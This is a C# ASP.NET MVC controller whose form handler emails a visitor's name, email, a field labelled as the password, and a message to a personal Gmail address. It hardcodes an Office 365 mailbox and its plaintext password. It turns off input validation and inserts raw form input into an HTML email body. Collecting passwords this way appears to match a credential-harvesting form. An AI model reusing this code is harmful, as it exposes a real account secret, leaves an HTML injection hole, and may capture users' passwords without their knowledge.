using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Web;
using System.Web.Mvc;

namespace PasosWeb.Controllers
{
    public class PaginaPrincipalController : Controller
    {
        // GET: PaginaPrincipal
        public ActionResult Index()
        {
            return View();
        }
        [HttpPost, ValidateInput(false)]
        public ActionResult EnviarFormulario(PasosWeb.Models.Formulario formulario)
        {
            try {
                var fromAddress = new MailAddress("soporte.homemx@outlook.es", "Nombre de Soporte");
                var toAddress = new MailAddress("miguel.cupulosorio@gmail.com", "Usuario en Contacto");

                const string fromPassword = "@miangelyazmin1A";
                const string subject = "Envío de información de usuario en contacto";
                string body = "<body>" +
                   "<h1>Solicitud de Envío de Información</h1>" +
                   "<h2>Informacion de contacto: </h2>" +
                    "<h3>Nombre de Usuario: </h3>" + formulario.nombre +
                    "<h3>Correo Electrónico: </h3>" + formulario.correo +
                     "<h3>Contraseña: </h3>" + formulario.asunto +
                     "<h3>Mensaje: </h3>" + formulario.mensaje +
                    "<br/>" +
                   "<span>El correo maneja datos sensible, Por Favor, No comparta la Información ni Reenvíe el Correo</span>" +
                   "<br/><br/><span>Saludos Cordiales.</span>" +
                   "</body>";

                var smtp = new SmtpClient
                {
                    Host = "smtp.office365.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                };
                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    IsBodyHtml = true,
                    Body = body
                })
                {
                    smtp.Send(message);
                }
                
            }
            catch (Exception ex) 
            {
                ViewData["EditError"] = ex.Message;
            }
            return RedirectToAction("Index", "PaginaPrincipal");
        }

    }
}